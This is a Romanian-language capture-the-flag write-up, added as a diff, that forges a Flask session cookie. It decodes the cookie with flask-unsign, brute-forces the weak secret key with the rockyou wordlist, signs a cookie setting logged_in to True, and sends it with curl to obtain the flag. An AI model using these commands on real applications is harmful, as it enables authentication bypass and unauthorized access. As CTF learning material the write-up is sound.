@@ -1,0 +1,31 @@
+### 🚩 Write-up: Challenge Access Denied (Flask Session Manipulation)
+
+* **1. Analiza inițială a Serverului**
+    * **Comandă:** `curl -i http://34.40.105.109:31566`
+    * **Explicație:** Am verificat header-ele de răspuns. Am identificat serverul ca fiind `Werkzeug/Python` și prezența unui cookie de sesiune numit `session`.
+    * **Indiciu:** Valoarea cookie-ului începea cu `eyJ...`, ceea ce indică un format Base64 specific sesiunilor Flask.
+
+* **2. Decodarea Cookie-ului (Reconnaissance)**
+    * **Comandă:** `flask-unsign --decode --cookie "[COOKIE_INITIAL]"`
+    * **Explicație:** Am verificat ce date sunt stocate în interiorul sesiunii fără a încerca să le modificăm.
+    * **Rezultat:** Am aflat că structura este `{'logged_in': False}`.
+
+* **3. Brute-force pentru Secret Key**
+    * **Comandă:** `flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie "[COOKIE_INITIAL]" --no-literal-eval`
+    * **Explicație:** Deoarece sesiunile Flask sunt semnate criptografic, am avut nevoie de cheia secretă a serverului pentru a genera un cookie nou valid.
+    * **Rezultat:** Am găsit cheia secretă: `password`. Argumentul `--no-literal-eval` a fost necesar pentru a procesa corect intrările din wordlist.
+
+* **4. Sincronizarea Timpului (Critical Step)**
+    * **Comenzi:** * `sudo timedatectl set-timezone Europe/Bucharest`
+        * `sudo timedatectl set-ntp true`
+    * **Explicație:** Sesiunile Flask conțin un timestamp. Dacă ora sistemului local (Kali) nu coincide cu cea a serverului, cookie-ul este respins ca fiind expirat. Sincronizarea a asigurat validitatea timestamp-ului.
+
+* **5. Generarea Cookie-ului Falsificat (Exploit)**
+    * **Comandă:** `flask-unsign --sign --cookie "{'logged_in': True}" --secret 'password' --no-literal-eval`
+    * **Explicație:** Folosind cheia găsită (`password`), am creat o sesiune nouă unde am schimbat starea utilizatorului în `True`.
+    * **Rezultat:** Am obținut un token semnat care va fi acceptat de server ca fiind legitim.
+
+* **6. Obținerea Flag-ului**
+    * **Comandă:** `curl -i http://34.40.105.109:31566 -b "session=[NOUL_COOKIE]"`
+    * **Explicație:** Am trimis cererea HTTP finală injectând cookie-ul falsificat prin flag-ul `-b`.
+    * **Rezultat:** Serverul a validat sesiunea și a returnat codul `200 OK` împreună cu flag-ul.
